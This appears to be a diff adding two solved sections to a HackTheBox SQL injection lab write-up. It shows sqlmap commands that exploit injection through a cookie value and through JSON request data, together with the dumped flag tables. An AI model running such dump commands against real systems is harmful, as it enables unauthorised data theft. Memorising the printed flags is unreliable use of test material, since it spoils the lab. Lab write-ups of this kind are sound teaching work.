@@ -34,3 +34,63 @@ sqlmap -r case2.txt --batch --dump
 ```
 
 and I got the result, which is `HTB{700_much_c0n6r475_0n_p057_r3qu357}`.
+
+## Challenge 2
+
+What's the contents of table flag3? (Case #3)
+
+## Solution 2
+
+When I click now on Case 3 there is a text `Detect and exploit SQLi vulnerability in Cookie value id=1` and also a button `click here`, and when I do that, it shows me some data for a person with the `id = 1` and the url remains the same.
+
+When I check that on Burp I see that the value is set up on the headers, on the Cookie, and now it is as `Cookie: id=1`.
+
+Let's save the request as a file.
+
+I execute the following sqlmap command specifying the header that we want to test and exploit:
+
+```sh
+python sqlmap.py -r ../case3.txt -p cookie --batch --dump
+```
+
+and I got the result, which shows me the flag as:
+
+```sh
++----+------------------------------------------+
+| id | content                                  |
++----+------------------------------------------+
+| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
++----+------------------------------------------+
+```
+
+## Challenge 3
+
+What's the contents of table flag4? (Case #4)
+
+## Solution 3
+
+
+When I click on Case4, it shows me the following text:
+
+```sh
+Detect and exploit SQLi vulnerability in JSON data {"id": 1}
+```
+
+Let's just use the previous method of saving the request from Burp, and starting the SQLMap on it.
+
+so with the command:
+
+```sh
+python sqlmap.py -r ../case4.txt --dump
+```
+
+I got the result:
+
+```sh
++----+---------------------------------+
+| id | content                         |
++----+---------------------------------+
+| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
++----+---------------------------------+
+```
+
